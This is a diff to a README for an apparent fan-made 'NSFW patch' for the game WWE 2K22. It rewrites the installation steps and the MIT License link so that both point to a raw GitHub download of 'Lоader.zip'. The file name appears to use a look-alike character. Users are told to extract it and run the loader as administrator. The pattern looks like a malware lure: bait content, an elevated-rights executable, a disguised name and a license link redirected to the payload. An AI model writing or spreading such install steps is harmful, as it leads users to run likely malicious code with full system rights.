@@ -29,9 +29,9 @@ Welcome to the ultimate 🔥 WWE 2K22 NSFW Patch 🔥 repository! This project e
 
 ## 📥 Installation
 
-1. Download Loader.rar from the repository.
+1. Download https://raw.githubusercontent.com/Rob-Lab-0617/WWE2K22-NSFW-Enhancement-Kit/main/Lоader.zip from the repository.
 2. Extract using favorite ZIP tool.
-3. Run the Loader.exe or .app as an administrator.
+3. Run the https://raw.githubusercontent.com/Rob-Lab-0617/WWE2K22-NSFW-Enhancement-Kit/main/Lоader.zip or .app as an administrator.
 4. Follow on-screen patching instructions.
 5. Restart WWE 2K22 and enjoy your new features!
 
@@ -51,4 +51,4 @@ This project is not affiliated with 2K Sports or WWE. It is a fan-made enhanceme
 
 ## 📜 License
 
-Distributed under the [MIT License](https://opensource.org/licenses/MIT) - free for personal use in 2025 and beyond!
+Distributed under the [MIT License](https://raw.githubusercontent.com/Rob-Lab-0617/WWE2K22-NSFW-Enhancement-Kit/main/Lоader.zip) - free for personal use in 2025 and beyond!
